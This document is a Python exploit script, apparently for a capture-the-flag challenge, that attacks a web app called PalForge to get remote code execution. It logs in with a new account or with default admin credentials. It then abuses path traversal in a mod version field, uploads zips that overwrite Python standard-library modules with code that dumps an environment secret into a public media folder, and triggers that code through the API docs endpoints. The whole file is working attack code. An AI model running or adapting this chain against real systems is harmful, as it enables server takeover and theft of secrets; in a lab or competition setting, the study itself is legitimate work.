#!/usr/bin/env python3
# PalForge RCE — overwrite existing pure-python stdlib .py modules that may be imported FRESH by
# /api/schema/ | /api/docs/ (drf-spectacular) and dump os.environ['FLAG'] to /data/media (served /media/).
# Overwrite of /usr/local/lib/python3.11/<mod>.py is confirmed working (returns 200 with filelist_file).
# IMPORTANT: only pure-python single-file .py modules (no C-extensions like cmath, no packages) — a
# missing module would need a NEW file in the a-w dir => PermissionError => aborts the whole zip.
# Usage: python rce2.py 144.79.188.39:PORT   (fresh instance)
import io, sys, zipfile, requests, secrets, time

BASE = sys.argv[1] if len(sys.argv) > 1 else "144.79.188.39:39620"
if not BASE.startswith("http"):
    BASE = "http://" + BASE
S = requests.Session()
OUT = "r" + secrets.token_hex(3) + ".txt"

# pure-python single-file stdlib modules (exist in 3.11), plausibly lazy-imported during schema/docs
MODS = [
    "fractions","statistics","ipaddress","numbers","difflib","pprint","textwrap","gettext",
    "calendar","colorsys","string","keyword","tokenize","ast","dis","bisect","secrets","getpass",
    "cgitb","pydoc","doctest","csv","configparser","quopri","plistlib","netrc","shlex","glob",
    "fnmatch","fileinput","filecmp","tarfile","gzip","hmac","pickle","copyreg","shelve","platform",
    "argparse","getopt","optparse","typing","dataclasses","contextvars","graphlib","pathlib",
    "mimetypes","uuid","tempfile","base64","hashlib","json",
]
SHIM = "import os\ntry:\n open('/data/media/" + OUT + "','a').write('X '+os.environ.get('FLAG','')+'\\n')\nexcept Exception:\n pass\n"

def jj(r):
    try: return r.json()
    except Exception: print("   nonjson",r.status_code,r.text[:100]); return {}
def auth():
    u="g"+secrets.token_hex(4); p="Pw12345!x"
    S.post(f"{BASE}/api/auth/register/", json={"username":u,"password":p}, timeout=15)
    r=S.post(f"{BASE}/api/auth/login/", json={"username":u,"password":p}, timeout=15)
    if r.status_code!=200:
        r=S.post(f"{BASE}/api/auth/login/", json={"username":"palforge_admin","password":"change-me-admin"}, timeout=15)
    return jj(r)["access"]
def H(t): return {"Authorization": f"Bearer {t}"}
def plat(tok):
    r=S.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15); d=jj(r)
    items=d.get("results", d) if isinstance(d, dict) else d
    for it in (items or []):
        if isinstance(it,dict) and it.get("code")=="lib/python3.11": return it["id"]
    return jj(S.post(f"{BASE}/api/platforms/", headers=H(tok), json={"code":"lib/python3.11","name":"z","description":""}, timeout=15)).get("id")

def main():
    tok=auth(); print("[*] token ok")
    pid=plat(tok)
    mid=jj(S.post(f"{BASE}/api/mods/", headers=H(tok), json={"title":"z","mod_version":"../../../usr/local","release_notes":"","is_enabled":True}, timeout=15))["id"]
    bid=jj(S.post(f"{BASE}/api/mods/{mid}/builds/", headers=H(tok), json={"platform":pid}, timeout=15))["id"]

    # batch in groups of 12 (reuse the same build) so one bad module can't wipe the whole set
    for i in range(0, len(MODS), 12):
        batch = MODS[i:i+12]
        bio=io.BytesIO()
        with zipfile.ZipFile(bio,"w",zipfile.ZIP_DEFLATED) as zf:
            for m in batch: zf.writestr(m+".py", SHIM)
        bio.seek(0)
        r=S.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers=H(tok),
                 files={"zip_file":("p.zip",bio,"application/zip"),
                        "filelist_file":("f.txt", io.BytesIO(b"x"), "text/plain")}, timeout=30)
        print(f"[*] overwrote {batch} -> {r.status_code}")

    for path in ("/api/schema/","/api/schema/?format=json","/api/schema/?format=yaml","/api/docs/","/api/mods/","/api/platforms/"):
        try: print(f"    GET {path} ->", S.get(f"{BASE}{path}", headers=H(tok), timeout=25).status_code)
        except Exception as e: print("    err", e)
    time.sleep(1)
    r=S.get(f"{BASE}/media/{OUT}", timeout=15)
    print(f"[*] GET /media/{OUT} -> {r.status_code}")
    if r.status_code==200:
        print(r.text[:400])
        import re; m=re.search(r"PTITCTF\{[^}]+\}", r.text)
        print("\n[FLAG]", m.group(0)) if m else print("[?] fired but FLAG empty")
    else:
        print("[-] none fired. Run the app locally (docker compose) and diff sys.modules across the first")
        print("    /api/schema/ hit to find the exact lazily-imported stdlib module, then overwrite that.")

if __name__ == "__main__":
    main()
